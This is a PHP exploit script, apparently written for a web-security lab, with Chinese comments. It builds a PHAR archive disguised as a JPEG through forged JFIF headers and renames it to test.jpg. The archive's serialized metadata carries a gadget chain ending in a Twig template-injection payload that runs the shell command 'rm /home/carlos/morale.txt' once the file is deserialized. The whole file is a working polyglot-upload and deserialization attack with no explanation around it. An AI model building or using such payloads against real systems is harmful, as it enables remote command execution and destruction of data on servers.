
<?php

class CustomTemplate {
    private $template_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }
}

class Blog {
    public $user;
    public $desc;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }
}
class TestObject {
    public $data; 
    
    public function __construct($payload) {
        $this->data = $payload;
    }
}

$s1 = new Blog('','{{_self.env.registerUndefinedFilterCallback("rm /home/carlos/morale.txt")}}');
$payload = new CustomTemplate($s1);

// 删除已存在的phar文件
@unlink("test.phar");
@unlink("test.jpg");

// 创建新的Phar对象
$phar = new Phar("test.phar");

// 开始缓冲写入
$phar->startBuffering();


// 构建更真实的JPEG文件头
$jpeg_soi = "\xFF\xD8"; // Start of Image
$jpeg_app0 = "\xFF\xE0" . pack('n', 16) . "JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"; // APP0 segment

// 添加更多JPEG段使文件更真实
$comment = "\xFF\xFE" . pack('n', 12) . "PHAR_PAYLOAD"; // Comment segment
$dqt = "\xFF\xDB" . pack('n', 67) . str_repeat("\x00", 65); // Dummy quantization table

// 构建完整的stub
$stub = $jpeg_soi . $jpeg_app0 . $comment . $dqt . "<?php __HALT_COMPILER(); ?>";

$phar->setStub($stub);


// 创建要序列化的对象
$o = new TestObject($payload);

// 将自定义的meta-data存入manifest，这里会自动进行序列化
$phar->setMetadata($o);

// Phar::addFromString() 方法的作用是向 PHAR 归档中‌添加一个文件。该方法接收两个参数：第一个是文件在归档内保存的路径，第二个是该文件的内容。
$phar->addFromString("image.jpg", "fake image content");
$phar->addFromString("info.txt", "Serialized payload embedded");

// 停止缓冲并保存文件
$phar->stopBuffering();

rename('test.phar', 'test.jpg');

echo "PHAR文件生成完成，元数据已序列化\n";
?>
